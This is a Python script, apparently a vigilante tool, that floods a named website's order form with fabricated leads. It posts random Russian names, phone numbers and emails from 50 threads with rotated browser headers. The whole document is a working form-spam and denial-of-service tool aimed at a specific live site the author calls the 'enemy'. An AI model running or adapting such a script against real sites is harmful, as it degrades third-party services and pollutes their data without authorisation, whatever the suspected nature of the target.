import requests
import string
import random
import threading
import json
import time
from transliterate import translit
from user_agents import get_header


# Enemy's URL
URL = "https://eltaninvesting.website/order.php"

# Getting one of 10 random headers
CURRENT_HEADER = get_header()

with open("counter.json", "r") as file:
    counter = json.load(file)

# Global variables are bad, but I didn't find and other solution
COUNTER = counter["counter"]

# Getting random fake data
names = json.loads(open("data/names.json").read())
last_names = json.loads(open("data/lastnames.json").read())
geo = json.loads(open("data/geo.json").read())
zone = json.loads(open("data/zone.json").read())

# Starting requests session
r = requests.Session()

# Request function
def do_requests():
    global COUNTER

    while True:
        name = random.choice(names)
        last_name = random.choice(last_names)

        # 7 digits preparing
        raw_phone = "".join(random.choice(string.digits) for _ in range(7))
        
        # 10 digit RU phone number done
        phone = str(random.randrange(901, 999)) + raw_phone

        # Email name part is done
        email_name = translit(name, "ru", reversed=True).lower()

        # Removing a possibly dangerous character
        if "'" in email_name:
            email_name = email_name.replace("'", "")

        # Generating random email domain
        random_zone = random.choice(zone)
        domain = "".join(random.choice(string.ascii_lowercase) for _ in range(random.randint(4, 10))) + "." + random_zone
        current_email = email_name + str(random.randint(33, 92382)) + "@" + domain

        current_geo = random.choice(geo)

        current_data = {
            "name": name,
            "last_name": last_name,
            "email": current_email,
            "phone": phone,
            "split_landing_id": "",
            "products": "1",
            "comment": "",
            "geo": current_geo,
            "stream": "1749"
        }

        try:
            result = r.post(URL, allow_redirects=False, headers=CURRENT_HEADER, data=current_data).status_code

            match result:
                case 302:
                    response = "[GOOD] Successful redirect"
                case 508:
                    response = "[FAIL] Loop detected"
                case 200:
                    response = "[WTF?] Stranger things"

        except Exception as e:
            result = "[FAIL] Server is not responding"

        print(
        f"""
[INFO] Email: {current_email} - [{current_geo}]
Name: {name} {last_name}
Phone: {phone}
Response code: {response}
Counter: {COUNTER} """)
        
        COUNTER += 1
        time.sleep(2)


def main():
    global COUNTER

    threads = []

    # 50 threads on the go
    try:
        for i in range(50):
            t = threading.Thread(target=do_requests)
            t.daemon = True
            threads.append(t)

        for i in range(50):
            threads[i].start()
        
        for i in range(50):
            threads[i].join()

    except KeyboardInterrupt:
        print("\n[STOP] Exiting..")

    finally:
        data = {"counter": COUNTER}
        json_object = json.dumps(data, indent=4, ensure_ascii=False)

        with open("counter.json", "w") as outfile:
            outfile.write(json_object)

        print(f"[STOP] Terminated on: {COUNTER}")


if __name__ == "__main__":
    main()
